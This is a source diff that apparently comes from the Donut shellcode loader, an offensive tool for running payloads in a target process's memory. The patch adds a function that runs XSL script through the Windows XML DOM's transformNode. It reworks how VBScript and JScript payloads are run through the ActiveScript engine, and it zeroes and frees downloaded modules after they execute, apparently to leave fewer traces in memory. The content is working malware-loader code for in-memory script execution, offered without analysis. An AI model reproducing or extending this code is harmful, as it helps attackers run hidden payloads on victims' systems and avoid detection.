@@ -107,10 +107,26 @@ DWORD ThreadProc(LPVOID lpParameter) {
       FreeAssembly(inst, &assembly);
     } else 
     // vbs or js?
-    if (mod->type == DONUT_MODULE_VBS ||
+    if(mod->type == DONUT_MODULE_VBS ||
         mod->type == DONUT_MODULE_JS)
     {
       RunScript(inst);
+    } else
+    // xml?
+    if(mod->type == DONUT_MODULE_XML) {
+      RunXML(inst);
+    }
+    
+    // if module was downloaded
+    if(inst->type == DONUT_INSTANCE_URL) {
+      if(inst->module.p != NULL) {
+        // overwrite memory with zeros
+        Memset(inst->module.p, 0, (DWORD)inst->mod_len);
+        
+        // free memory
+        inst->api.VirtualFree(inst->module.p, 0, MEM_RELEASE | MEM_DECOMMIT);
+        inst->module.p = NULL;
+      }
     }
     // clear instance from memory
     Memset(inst, 0, inst->len);
@@ -404,18 +420,7 @@ BOOL RunAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
 }
   
 VOID FreeAssembly(PDONUT_INSTANCE inst, PDONUT_ASSEMBLY pa) {
-  
-    if(inst->type == DONUT_INSTANCE_URL) {
-      if(inst->module.p != NULL) {
-        // overwrite with zeros
-        Memset(inst->module.p, 0, (DWORD)inst->mod_len);
-        
-        // free memory
-        inst->api.VirtualFree(inst->module.p, 0, MEM_RELEASE | MEM_DECOMMIT);
-        inst->module.p = NULL;
-      }
-    }
-    
+      
     if(pa->type != NULL) {
       DPRINT("Type::Release");
       pa->type->lpVtbl->Release(pa->type);
@@ -652,6 +657,8 @@ VOID RunXML(PDONUT_INSTANCE inst) {
     VARIANT_BOOL    loaded;
     BSTR            res;
     PDONUT_MODULE   mod;
+    ULONG64         len;
+    UCHAR           c;
     
     if(inst->type == DONUT_INSTANCE_PIC) {
       DPRINT("Using module embedded in instance");
@@ -661,38 +668,64 @@ VOID RunXML(PDONUT_INSTANCE inst) {
       mod = inst->module.p;
     }
     
-    // 1. Initialize COM
-    DPRINT("CoInitializeEx");
-    hr = inst->api.CoInitializeEx(NULL, COINIT_MULTITHREADED);
-    if(hr == S_OK) {
-      // 2. Instantiate XMLDOMDocument object
-      DPRINT("CoCreateInstance");
-      hr = inst->api.CoCreateInstance(
-        &inst->xCLSID_DOMDocument30, 
-        NULL, CLSCTX_INPROC_SERVER,
-        &inst->xIID_IXMLDOMDocument, 
-        (void**)&pDoc);
+    // 1. Allocate memory for unicode format of script
+    xml_str = (PWCHAR)inst->api.VirtualAlloc(
+        NULL, 
+        (inst->mod_len + 1) * sizeof(WCHAR), 
+        MEM_COMMIT | MEM_RESERVE, 
+        PAGE_READWRITE);
         
-      if(hr == S_OK) {
-        // 3. load XML file
-        DPRINT("IXMLDOMDocument::loadXML");
-        hr = pDoc->lpVtbl->loadXML(pDoc, (BSTR)mod->data, &loaded);
-        if(hr == S_OK && loaded) {
-          // 4. query node interface
-          DPRINT("IXMLDOMDocument::QueryInterface");
-          hr = pDoc->lpVtbl->QueryInterface(
-            pDoc, &inst->xIID_IXMLDOMNode, (void **)&pNode);
-            
-          if(hr == S_OK) {
-            // 5. execute script
-            DPRINT("IXMLDOMDocument::transformNode");
-            hr = pDoc->lpVtbl->transformNode(pDoc, pNode, &res);
-            pNode->lpVtbl->Release(pNode);
-          }
-        }
-        pDoc->lpVtbl->Release(pDoc);
+    // 2. Convert string to unicode.
+    //    This should probably be replaced with MultiByteToWideChar()
+    if(xml_str != NULL) {
+      for(len = 0; len < mod->len; len++) {
+        c = mod->data[len];
+        xml_str[len] = c;
       }
-      inst->api.CoUninitialize();
+      // 3. Initialize COM
+      DPRINT("CoInitializeEx");
+      hr = inst->api.CoInitializeEx(NULL, COINIT_MULTITHREADED);
+      DPRINT("HRESULT: %08lx", hr);
+      
+      if(hr == S_OK) {
+        // 4. Instantiate XMLDOMDocument object
+        DPRINT("CoCreateInstance");
+        hr = inst->api.CoCreateInstance(
+          &inst->xCLSID_DOMDocument30, 
+          NULL, CLSCTX_INPROC_SERVER,
+          &inst->xIID_IXMLDOMDocument, 
+          (void**)&pDoc);
+          
+        DPRINT("HRESULT: %08lx", hr);
+        if(hr == S_OK) {
+          // 5. load XML file
+          DPRINT("IXMLDOMDocument::loadXML");
+          hr = pDoc->lpVtbl->loadXML(pDoc, (BSTR)xml_str, &loaded);
+          DPRINT("HRESULT: %08lx loaded : %s", 
+            hr, loaded ? "TRUE" : "FALSE");
+            
+          if(hr == S_OK && loaded) {
+            // 6. query node interface
+            DPRINT("IXMLDOMDocument::QueryInterface");
+            hr = pDoc->lpVtbl->QueryInterface(
+              pDoc, &inst->xIID_IXMLDOMNode, (void **)&pNode);
+              
+            if(hr == S_OK) {
+              DPRINT("HRESULT: %08lx", hr);
+              // 7. execute script
+              DPRINT("IXMLDOMDocument::transformNode");
+              hr = pDoc->lpVtbl->transformNode(pDoc, pNode, &res);
+              DPRINT("HRESULT: %08lx", hr);
+              pNode->lpVtbl->Release(pNode);
+            }
+          }
+          pDoc->lpVtbl->Release(pDoc);
+        }
+        DPRINT("CoUninitialize");
+        inst->api.CoUninitialize();
+      }
+      DPRINT("VirtualFree()");
+      inst->api.VirtualFree(xml_str, 0, MEM_RELEASE | MEM_DECOMMIT);
     }
 }
 
@@ -710,12 +743,15 @@ static STDMETHODIMP OnEnterScript(IActiveScriptSite *this);
 static STDMETHODIMP OnLeaveScript(IActiveScriptSite *this);
 
 VOID RunScript(PDONUT_INSTANCE inst) {
-    HRESULT	               hr;
+    HRESULT                hr;
     IActiveScriptParse     *parser;
-    IActiveScript		       *engine;
+    IActiveScript          *engine;
     MyIActiveScriptSite    mas;
     IActiveScriptSiteVtbl2 vf_tbl;
     PDONUT_MODULE          mod;
+    PWCHAR                 script;
+    ULONG64                len;
+    UCHAR                  c;
     
     if(inst->type == DONUT_INSTANCE_PIC) {
       DPRINT("Using module embedded in instance");
@@ -725,79 +761,98 @@ VOID RunScript(PDONUT_INSTANCE inst) {
       mod = inst->module.p;
     }
 
-    // 1. Initialize IActiveScriptSiteVtbl2 and assign to lpVtbl pointer
-    //    Create event for when script ends
-    vf_tbl.QueryInterface      = ADR(ULONG_PTR, QueryInterface);
-    vf_tbl.AddRef              = ADR(ULONG_PTR, AddRef);
-    vf_tbl.Release             = ADR(ULONG_PTR, Release);
-    vf_tbl.GetLCID             = ADR(ULONG_PTR, GetLCID);
-    vf_tbl.GetItemInfo         = ADR(ULONG_PTR, GetItemInfo);
-    vf_tbl.GetDocVersionString = ADR(ULONG_PTR, GetDocVersionString);
-    vf_tbl.OnScriptTerminate   = ADR(ULONG_PTR, OnScriptTerminate);
-    vf_tbl.OnStateChange       = ADR(ULONG_PTR, OnStateChange);
-    vf_tbl.OnScriptError       = ADR(ULONG_PTR, OnScriptError);
-    vf_tbl.OnEnterScript       = ADR(ULONG_PTR, OnEnterScript);
-    vf_tbl.OnLeaveScript       = ADR(ULONG_PTR, OnLeaveScript);
-    
-    // 2. Initialize COM, MyIActiveScriptSite and event for OnLeaveScript method
-    DPRINT("CoInitializeEx");
-    inst->api.CoInitializeEx(NULL, COINIT_MULTITHREADED);
-    
-    mas.site.lpVtbl    = (IActiveScriptSiteVtbl*)&vf_tbl;
-    mas.siteWnd.lpVtbl = NULL;
-    mas.hEvent         = inst->api.CreateEvent(NULL, FALSE, FALSE, NULL);
-    mas._SetEvent      = (SetEvent_t)inst->api.SetEvent;
-    
-    // 3. Instantiate the active script engine
-    DPRINT("CoCreateInstance");
-    hr = inst->api.CoCreateInstance(
-      &inst->xCLSID_ScriptLanguage, 0, CLSCTX_ALL, 
-      &inst->xIID_IActiveScript, (void **)&engine);
-      
-    if(hr == S_OK) {
-      // 4. Get IActiveScriptParse object from engine
-      DPRINT("IActiveScript::QueryInterface");
-		  hr = engine->lpVtbl->QueryInterface(
-        engine, 
-        #ifdef _WIN64
-        &inst->xIID_IActiveScriptParse64,
-        #else
-        &inst->xIID_IActiveScriptParse32,
-        #endif      
-        (void **)&parser);
+    // 1. Allocate memory for unicode format of script
+    script = (PWCHAR)inst->api.VirtualAlloc(
+        NULL, 
+        (inst->mod_len + 1) * sizeof(WCHAR), 
+        MEM_COMMIT | MEM_RESERVE, 
+        PAGE_READWRITE);
         
-      if(hr == S_OK) {
-        // 5. Initialize parser
-        DPRINT("IActiveScriptParse::InitNew");
-        hr = parser->lpVtbl->InitNew(parser);
-				if(hr == S_OK) {
-          // 6. Set custom script interface
-          DPRINT("IActiveScript::SetScriptSite");
-          hr = engine->lpVtbl->SetScriptSite(
-            engine, (IActiveScriptSite *)&mas);
-          if(hr == S_OK) {
-            // 7. Load script
-            DPRINT("IActiveScriptParse::ParseScriptText");
-            hr = parser->lpVtbl->ParseScriptText(
-              parser, (LPCOLESTR)mod->data, 0, 0, 0, 0, 0, 0, 0, 0);
-            if(hr == S_OK) {
-              // 8. Run script
-              DPRINT("IActiveScript::SetScriptState");
-              hr = engine->lpVtbl->SetScriptState(
-                engine, SCRIPTSTATE_CONNECTED);
-                
-              // 9. Wait for script to end
-              DPRINT("WaitForSingleObject");
-              inst->api.WaitForSingleObject(mas.hEvent, INFINITE);
-            }
-          }
-        }
-        parser->lpVtbl->Release(parser);
+    // 2. Convert string to unicode.
+    //    This should probably be replaced with MultiByteToWideChar()
+    if(script != NULL) {
+      for(len = 0; len < mod->len; len++) {
+        c = mod->data[len];
+        script[len] = c;
       }
-      engine->lpVtbl->Close(engine);
-      engine->lpVtbl->Release(engine);
+      
+      // 3. Initialize IActiveScriptSiteVtbl2 and assign to lpVtbl pointer
+      //    Create event for when script ends
+      vf_tbl.QueryInterface      = ADR(ULONG_PTR, QueryInterface);
+      vf_tbl.AddRef              = ADR(ULONG_PTR, AddRef);
+      vf_tbl.Release             = ADR(ULONG_PTR, Release);
+      vf_tbl.GetLCID             = ADR(ULONG_PTR, GetLCID);
+      vf_tbl.GetItemInfo         = ADR(ULONG_PTR, GetItemInfo);
+      vf_tbl.GetDocVersionString = ADR(ULONG_PTR, GetDocVersionString);
+      vf_tbl.OnScriptTerminate   = ADR(ULONG_PTR, OnScriptTerminate);
+      vf_tbl.OnStateChange       = ADR(ULONG_PTR, OnStateChange);
+      vf_tbl.OnScriptError       = ADR(ULONG_PTR, OnScriptError);
+      vf_tbl.OnEnterScript       = ADR(ULONG_PTR, OnEnterScript);
+      vf_tbl.OnLeaveScript       = ADR(ULONG_PTR, OnLeaveScript);
+      
+      // 4. Initialize COM, MyIActiveScriptSite and event for OnLeaveScript method
+      DPRINT("CoInitializeEx");
+      hr = inst->api.CoInitializeEx(NULL, COINIT_MULTITHREADED);
+      
+      if(hr == S_OK) {
+        mas.site.lpVtbl    = (IActiveScriptSiteVtbl*)&vf_tbl;
+        mas.siteWnd.lpVtbl = NULL;
+        mas.hEvent         = inst->api.CreateEvent(NULL, FALSE, FALSE, NULL);
+        mas._SetEvent      = (SetEvent_t)inst->api.SetEvent;
+        
+        // 5. Instantiate the active script engine
+        DPRINT("CoCreateInstance");
+        hr = inst->api.CoCreateInstance(
+          &inst->xCLSID_ScriptLanguage, 0, CLSCTX_ALL, 
+          &inst->xIID_IActiveScript, (void **)&engine);
+      
+        if(hr == S_OK) {
+          // 6. Get IActiveScriptParse object from engine
+          DPRINT("IActiveScript::QueryInterface");
+          hr = engine->lpVtbl->QueryInterface(
+            engine, 
+            #ifdef _WIN64
+            &inst->xIID_IActiveScriptParse64,
+            #else
+            &inst->xIID_IActiveScriptParse32,
+            #endif      
+            (void **)&parser);
+            
+          if(hr == S_OK) {
+            // 7. Initialize parser
+            DPRINT("IActiveScriptParse::InitNew");
+            hr = parser->lpVtbl->InitNew(parser);
+            if(hr == S_OK) {
+              // 8. Set custom script interface
+              DPRINT("IActiveScript::SetScriptSite");
+              hr = engine->lpVtbl->SetScriptSite(
+                engine, (IActiveScriptSite *)&mas);
+              if(hr == S_OK) {
+                // 9. Load script
+                DPRINT("IActiveScriptParse::ParseScriptText");
+                hr = parser->lpVtbl->ParseScriptText(
+                  parser, (LPCOLESTR)script, 0, 0, 0, 0, 0, 0, 0, 0);
+                if(hr == S_OK) {
+                  // 10. Run script
+                  DPRINT("IActiveScript::SetScriptState");
+                  hr = engine->lpVtbl->SetScriptState(
+                    engine, SCRIPTSTATE_CONNECTED);
+                    
+                  // 11. Wait for script to end
+                  DPRINT("WaitForSingleObject");
+                  inst->api.WaitForSingleObject(mas.hEvent, INFINITE);
+                }
+              }
+            }
+            parser->lpVtbl->Release(parser);
+          }
+          engine->lpVtbl->Close(engine);
+          engine->lpVtbl->Release(engine);
+        }
+        inst->api.CloseHandle(mas.hEvent);
+      }
+      inst->api.VirtualFree(script, 0, MEM_RELEASE | MEM_DECOMMIT);
     }
-    inst->api.CloseHandle(mas.hEvent);
 }
 
 static STDMETHODIMP QueryInterface(IActiveScriptSite *this, REFIID riid, void **ppv) {
@@ -840,24 +895,24 @@ static STDMETHODIMP GetDocVersionString(IActiveScriptSite *this, BSTR *version) 
 
 static STDMETHODIMP OnScriptTerminate(IActiveScriptSite *this, 
   const VARIANT *pvr, const EXCEPINFO *pei) {
-    DPRINT("OnScriptTerminate()\n");
+    DPRINT("OnScriptTerminate");
     return S_OK;
 }
 
 static STDMETHODIMP OnStateChange(IActiveScriptSite *this, SCRIPTSTATE state) {
-    DPRINT("OnStateChange\n");
+    DPRINT("OnStateChange");
     return S_OK;
 }
 
 static STDMETHODIMP OnEnterScript(IActiveScriptSite *this) {
-    DPRINT("OnEnterScript()\n");
+    DPRINT("OnEnterScript");
     return S_OK;
 }
 
 static STDMETHODIMP OnLeaveScript(IActiveScriptSite *this) {
     MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;
     
-    DPRINT("OnScriptLeave()\n");
+    DPRINT("OnScriptLeave");
     
     mas->_SetEvent(mas->hEvent);
     
